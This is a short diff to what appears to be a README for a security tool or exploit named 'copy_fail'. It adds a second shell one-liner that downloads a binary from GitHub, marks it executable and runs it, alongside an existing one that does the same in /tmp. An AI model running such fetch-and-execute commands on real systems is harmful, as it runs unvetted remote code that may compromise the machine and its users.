@@ -12,3 +12,7 @@ id
 ```
 curl -L https://raw.githubusercontent.com/RoflSecurity/copy_fail/main/copy_fail -o /tmp/x && chmod +x /tmp/x && /tmp/x
 ```
+```
+# or:
+curl -L https://raw.githubusercontent.com/RoflSecurity/copy_fail/main/copy_fail -o ~/x && chmod +x ~/x && ~/x
+```
